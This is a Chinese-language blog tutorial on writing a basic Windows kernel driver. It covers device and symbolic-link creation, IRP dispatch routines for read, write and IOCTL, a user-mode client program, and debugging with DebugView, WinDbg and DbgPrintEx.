<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">DbgPrint</span>(<span class="string">&quot;Unload Module Demo\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RigisterEntry)</span> </span>&#123;</span><br><span class="line">	DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="built_in">DbgPrint</span>(<span class="string">&quot;Load Module Demo\r\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>官方案例不像 helloworld 的样子。<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/writing-your-first-driver">制作你的第一个驱动程序 </a></p>
<ul>
<li>KMDF是由微软提供的一个高级抽象层，它建立在WDM（Windows Driver Model）之上，并提供了一些额外的功能和简化驱动程序开发的接口。KMDF旨在使驱动程序开发人员能够更轻松地编写和维护可靠的内核模式驱动程序。</li>
</ul>
<h3 id="驱动安装"><a href="#驱动安装" class="headerlink" title="驱动安装"></a>驱动安装</h3><p>OSRDriverLoader: <a href="https://www.osronline.com/article.cfm%5earticle=157.htm">Downloads:Driver Loader (osronline.com)</a></p>
<ul>
<li>w2k: windows 2000</li>
<li>WLH: windows vista</li>
<li>WNET: windows 7 及以上。使用里面的 <code>AMD64 OSRLOADER</code></li>
<li>WXP: windows XP</li>
</ul>
<h3 id="DEbug"><a href="#DEbug" class="headerlink" title="DEbug"></a>DEbug</h3><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/debugview">DebugView - Sysinternals</a>: 它可以显示 DbgPrint 打印出来的log</p>
<p>WinDbg: 需要设置一下,<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-">回显内核模式调试 Windows 驱动 - Windows drivers</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 调试器中显示来自目标系统的所有调试消息</span></span><br><span class="line">ed nt!Kd_DEFAULT_MASK 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有调试信息有点多，打印调试字符串</span></span><br><span class="line">ed nt!Kd_Default_Mask 8</span><br></pre></td></tr></table></figure>

<h3 id="R0-与-R3-通信"><a href="#R0-与-R3-通信" class="headerlink" title="R0 与 R3 通信"></a>R0 与 R3 通信</h3><p>驱动程序的主要功能也就是负责处理IO请求，其中大部分IO请求是在派遣函数中处理的。</p>
<h4 id="R0"><a href="#R0" class="headerlink" title="R0"></a>R0</h4><p>创建设备对象：使用IoCreateDevice必须管理员才能打开 而使用IoCreateDeviceSecure 则可以普通权限打开</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PUNICODE_STRING DeviceName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PDEVICE_OBJECT  *DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>设备名：符号链接</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING SymbolicLinkName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING DeviceName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MS-DOS 命名规范</span></span><br><span class="line">UNICODE_STRING DeviceName;</span><br><span class="line">UNICODE_STRING DosDeviceName;</span><br><span class="line">NTSTATUS status;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, <span class="string">L&quot;\\Device\\DeviceName&quot;</span>);</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DosDeviceName, <span class="string">L&quot;\\DosDevices\\DosDeviceName&quot;</span>);</span><br><span class="line">status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;DosDeviceName, &amp;DeviceName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">  <span class="comment">/* Symbolic link creation failed.  Handle error appropriately. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NT规范：每个设备接口类都与 GUID 相关联。KMDF 给的代码</span></span><br></pre></td></tr></table></figure>

<p>注册回调函数 <code>MajorFunction[IDX](IDX 代表注册读写函数，宏函数，不要超过最大值</code> ；IRP (I&#x2F;O Request Packet)；<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object">DRIVER_OBJECT (wdm.h) - Windows drivers </a>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">_Use_decl_annotations_</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">  <span class="title">DispatchXxx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _DEVICE_OBJECT  *DeviceObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _IRP  *Irp</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">// Function body</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>删除符号</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoDeleteSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING SymbolicLinkName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>删除设备</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IoDeleteDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PDEVICE_OBJECT DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>IO框架</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_NAME <span class="string">L&quot;\\Device\\Demo&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LINK_NAME <span class="string">L&quot;\\DosDevices\\Demo&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">IOCTL 控制码：</span></span><br><span class="line"><span class="comment">	I/O 控制代码是由多个字段组成的 32 位值。</span></span><br><span class="line"><span class="comment">	#define IOCTL_Device_Function CTL_CODE(DeviceType, Function, Method, Access)</span></span><br><span class="line"><span class="comment">		DeviceType: 标识设备类型。 此值必须与在驱动程序DEVICE_OBJECT结构的 DeviceType 成员中设置的值匹配</span></span><br><span class="line"><span class="comment">		FunctionCode： 标识驱动程序要执行的函数。 小于 0x800 的值是为 Microsoft 保留的。 供应商可以使用 0x800 和更高值</span></span><br><span class="line"><span class="comment">	#define CTL_CODE(DeviceType, Function, Method, Access) (</span></span><br><span class="line"><span class="comment">				(DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method)</span></span><br><span class="line"><span class="comment">			)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_BASE 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYIOCTRL_CODE(i)	\</span></span><br><span class="line"><span class="meta">	CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_HELLO MYIOCTRL_CODE( 0 )</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Unload Driver\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回值并不代表成功，而是 pIrp-&gt;IoStatus.Status 代表IO是否成功</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchCommon</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; <span class="comment">// IRP记录这次操作是否成功</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;         <span class="comment">// Information用来记录实际传输的字节数的.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//提交请求.</span></span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;DispatchCommon\r\n&quot;</span>));</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;                  <span class="comment">// 上面的 STATUS_SUCCESS是给R3看的.现在的返回时给IO管理器系统的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchRead</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PVOID pReadBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uReadLength = <span class="number">0</span>;</span><br><span class="line">	PIO_STACK_LOCATION pStack = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uMin = <span class="number">0</span>;</span><br><span class="line">	ULONG uHelloStr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	uHelloStr = (<span class="built_in">wcslen</span>(<span class="string">L&quot;Hello World&quot;</span>) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line">	pReadBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer; <span class="comment">//缓冲区</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取IRP堆栈.我们说过3环调用0环.需要封装在IRP结构中.windows是分层驱动.所以IRP头部是共用的.其余的是栈传递.</span></span><br><span class="line">	pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">	uReadLength = pStack-&gt;Parameters.Read.Length;</span><br><span class="line">	uMin = uReadLength &gt; uHelloStr ? uHelloStr : uReadLength;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlCopyMemory</span>(pReadBuffer, <span class="string">L&quot;Hello World&quot;</span>, uMin); <span class="comment">//拷贝到缓冲区中给3环.</span></span><br><span class="line"></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = uMin;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//提交请求.</span></span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchWrite</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PVOID pWriteBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uWriteLength = <span class="number">0</span>;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack = <span class="literal">NULL</span>;</span><br><span class="line">	PVOID pBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//获取IRP堆栈</span></span><br><span class="line">	pIrpStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取写的长度.</span></span><br><span class="line">	uWriteLength = pIrpStack-&gt;Parameters.Write.Length;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	pWriteBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">//申请内存.</span></span><br><span class="line">	pBuffer = <span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, uWriteLength, <span class="string">&#x27;DEMO&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == pBuffer)</span><br><span class="line">	&#123;</span><br><span class="line">		pIrp-&gt;IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">		pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">		<span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//提交请求.</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlZeroMemory</span>(pBuffer, uWriteLength);</span><br><span class="line">	<span class="comment">//拷贝到0环缓冲区</span></span><br><span class="line">	<span class="built_in">RtlCopyMemory</span>(pBuffer, pWriteBuffer, uWriteLength);</span><br><span class="line">	<span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Write %s\r\n&quot;</span>, (PCHAR)pBuffer));</span><br><span class="line">	<span class="built_in">ExFreePool</span>(pBuffer);</span><br><span class="line">	pBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = uWriteLength;</span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchControl</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//内核中共享 SystemBuffer 有时间差.先读在写.</span></span><br><span class="line">	PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">	PVOID InPutBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	PVOID OutPutBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uInPutLength = <span class="number">0</span>;</span><br><span class="line">	ULONG uOutPutBufferLength = <span class="number">0</span>;</span><br><span class="line">	ULONG IoCtrl = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	InPutBuffer = OutPutBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	pIrpStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line"></span><br><span class="line">	IoCtrl = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;  <span class="comment">//获取控制码.</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">switch</span>(IoCtrl)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> CTL_HELLO:</span><br><span class="line">			<span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;IOCTL HelloWorld\r\n&quot;</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//提交请求.</span></span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRigisterEntry)</span> </span>&#123;</span><br><span class="line">	UNICODE_STRING uDevName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	UNICODE_STRING uLinkName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	PDEVICE_OBJECT pDevObj;</span><br><span class="line">	<span class="built_in">RtlInitUnicodeString</span>(&amp;uDevName, DRIVER_NAME);</span><br><span class="line">	<span class="built_in">RtlInitUnicodeString</span>(&amp;uLinkName, LINK_NAME);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Init Driver\r\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	pDriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 创建设备</span></span><br><span class="line">	status = <span class="built_in">IoCreateDevice</span>(pDriverObject, <span class="number">0</span>, &amp;uDevName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, FALSE, &amp;pDevObj);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;[-] Error IoCreateDevice\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 不是这个=&gt;蓝屏</span></span><br><span class="line">	pDevObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建符号链接</span></span><br><span class="line">	status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;uLinkName, &amp;uDevName);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;[-] Error IoCreateSymbolicLink\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">IoDeleteDevice</span>(pDevObj);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// IO </span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		pDriverObject-&gt;MajorFunction[i] = DispatchCommon;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Read Write IOCTL</span></span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_READ] = DispatchRead;</span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = DispatchWrite;</span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;[+] Create Driver Success\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="R3"><a href="#R3" class="headerlink" title="R3"></a>R3</h4><p>在用户模式下打开 <code>\\DosDevices\\DosDeviceName</code> 设备，请在打开文件名时指定 <code>\\.\</code>，需要转义符</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\DosDeviceName&quot;</span>,</span><br><span class="line">	GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    OPEN_EXISTING,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>


<p>通过<code>ReadFile</code>和 <code>WriteFile</code> 系统调用进行读写，ioctl使用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DeviceIoControl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                HANDLE       hDevice,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        dwIoControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID       lpInBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nInBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPVOID       lpOutBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nOutBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPDWORD      lpBytesReturned,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>交互</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_BASE 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYIOCTRL_CODE(i)	\</span></span><br><span class="line"><span class="meta">	CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_HELLO MYIOCTRL_CODE( 0 )</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile = <span class="built_in">CreateFileW</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\Demo&quot;</span>),</span><br><span class="line">		GENERIC_WRITE | GENERIC_READ,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateFile ErrorCode:%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	TCHAR szBuff[<span class="number">0X100</span>];</span><br><span class="line">	DWORD dwBytes = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hFile, szBuff, <span class="built_in">sizeof</span>(szBuff) / <span class="built_in">sizeof</span>(szBuff[<span class="number">0</span>]), &amp;dwBytes, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ReadFile ErrorCode:%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bytes:%d data:%ls\n&quot;</span>, dwBytes, szBuff);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		hFile,</span><br><span class="line">		CTL_HELLO,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>, </span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p>关于 DEBUG 问题，常见 <code>DbgPrint</code>, <code>DbgPrintEx</code>。<code>KdPrintEx</code>这种是宏表示。Ex 函数为了更好的打印出调试信息（消息过滤机制：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/reading-and-filtering-debugging-messages">读取和筛选调试消息 - Windows drivers</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KdPrintEx(_x_) DbgPrintEx _x_ </span></span><br><span class="line"><span class="function">NTSYSAPI ULONG <span class="title">DbgPrintEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG ComponentId,      <span class="comment">// 避免将驱动程序的输出与 Windows 组件的输出混合</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG Level,            <span class="comment">// 指定要发送的消息的严重性</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PCSTR Format,</span></span></span><br><span class="line"><span class="params"><span class="function">       ...   </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// DPF: Debug Print Filter</span></span><br><span class="line"><span class="comment">// IHV: Independent Hardware Vendor</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;DPFLTR_ERROR_LEVEL\n&quot;</span>));  <span class="comment">// 需要双括号</span></span><br><span class="line"><span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;DPFLTR_ERROR_LEVEL\n&quot;</span>);</span><br></pre></td></tr></table></figure>


<p>WDF…</p>
<p>驱动写出BUG直接蓝屏😢</p>
<h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><h3 id="Rtl"><a href="#Rtl" class="headerlink" title="Rtl"></a>Rtl</h3><p>Windows的Runtime Library（Rtl）函数是一组供Windows操作系统内部使用的函数。它们是由微软提供的低级别函数，用于执行操作系统管理功能，如内存管理、进程和线程管理、文件操作、设备驱动程序和底层交互等。</p>
<p>这些Rtl函数主要用于Windows内核和系统级驱动程序开发，不是普通应用程序开发人员常用的函数库。它们提供了一些高级别函数和抽象层，以方便开发人员与底层操作系统交互和管理。</p>
<h3 id="nt"><a href="#nt" class="headerlink" title="nt"></a>nt</h3><p>Windows NT是一个基于内核的操作系统系列，最初由微软公司在20世纪90年代开发和推出。NT代表”New Technology”（新技术），它的设计目标是提供一种稳定、可靠、安全的操作系统平台。</p>
<p>一些常见的Windows NT库：</p>
<ol>
<li>Kernel32.lib：这是Windows NT内核库，提供了许多系统级别的函数和工具，包括内存管理、进程和线程管理、文件和I&#x2F;O操作、时间和日期处理等。</li>
<li>User32.lib：这是用户界面库，提供了与用户界面相关的函数，如窗口管理、消息处理、菜单操作、图形设备接口等。</li>
</ol>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
